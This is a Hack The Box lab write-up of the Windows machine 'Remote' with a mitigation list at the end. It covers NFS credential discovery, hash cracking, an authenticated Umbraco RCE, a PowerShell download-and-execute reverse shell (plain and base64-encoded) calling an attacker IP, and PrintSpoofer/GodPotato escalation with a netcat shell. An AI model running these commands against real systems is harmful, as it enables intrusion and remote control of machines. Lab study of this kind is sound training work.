---
title: Remote
date: 2025-05-24
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Windows, NFS, Umbraco-RCE, PrintSpoofer-privesc, GodPotato-privesc] 
image: rem.png
media_subpath: /assets/img/posts/2025-05-24-remoteHTB/
---

## Introduction

In this walkthrough, I tackled the *Remote* machine, an easy Windows box. During initial enumeration, I discovered a **world-readable NFS share** which contained **Umbraco CMS credentials**. Using these, I authenticated to the Umbraco web interface and exploited a known **authenticated RCE vulnerability** to gain a foothold on the machine.

Upon landing access as the **IIS AppPool user**, I confirmed the presence of the **SeImpersonatePrivilege**. Leveraging this privilege with the **PrintSpoofer exploit**, I successfully escalated to a **SYSTEM shell**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 21 (FTP)

Anonymous access is allowed but nothing stored in FTP and our user doesn’t have write access there:

![image.png](image%202.png)

### Port 111/2049 (NFS)

Listing NFS shares I can see a share:

![image.png](image%203.png)

Create a directory and mount remote share to local directory:

```bash
sudo mount -t nfs $IP:/site_backups nfsshare -o nolock
```

Checking for mount directories I found interesting SHA1 hash:

```bash
strings Umbraco.sdf | grep admin
```

![image.png](image%204.png)

I tried cracking it with hashcat mode 100:

```bash
hashcat -m 100 hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%205.png)

### Port 139/445 (SMB)

- smbclient
    
    ```bash
    smbclient -L //$IP/ -N
    ```
    
    NT_STATUS_ACCESS_DENIED.
    
- enum4linux
    
    ```bash
    enum4linux $IP
    ```
    
    No result.
    

### Port 5985 (WinRM)

## Web

### Port 80 (HTTP)

## Credentials

```bash
admin@htb.local : baconandcheese
```

## Exploitation

After cracking the hash I tried to login to umbraco CMS.

![image.png](image%206.png)

and logged in to the server

I foudn that Umbraco version is `7.12.4` which is vulnerable to Authenticated Remote Code Execution vulnerability:
[Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49488)

I used the following PoC https://github.com/noraj/Umbraco-RCE:

```bash
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
```

![image.png](image%207.png)

Let’s get a reverse shell:

I encoded the following command to base64 using UTF-16LE character set:

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 135 -e cmd"
```

And used this command:

```bash
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -encodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQAwAC4AMQAwAC4AMQA0AC4AMQA3ACAALQBwACAAMQAzADUAIAAtAGUAIABjAG0AZAAiAA=='
```

![image.png](image%208.png)

## Privilege Escalation

We have `SeImpersonatePrivilege`:

![image.png](image%209.png)

Let’s perform PrintSpoofer attack:

```bash
.\PrintSpoofer.exe -i -c cmd
```

![image.png](image%2010.png)

**Alternative way:**

- GodPotato
    
    ```bash
    .\GodPotato-NET4.exe -cmd ".\nc64.exe -e cmd.exe 10.10.14.17 4445"
    ```
    

![image.png](image%2011.png)

It worked and we got nt authority\system shell.

## Mitigation

- **Secure NFS Shares:** Avoid exposing sensitive files on publicly accessible NFS shares; enforce strict permissions.
- **Update CMS Software:** Keep Umbraco CMS and its plugins up to date to patch known vulnerabilities.
- **Least Privilege Principle:** Limit privilege assignments such as SeImpersonatePrivilege to only necessary service accounts.
- **Web Application Hardening:** Use web application firewalls and limit administrative interfaces to internal or trusted IPs.
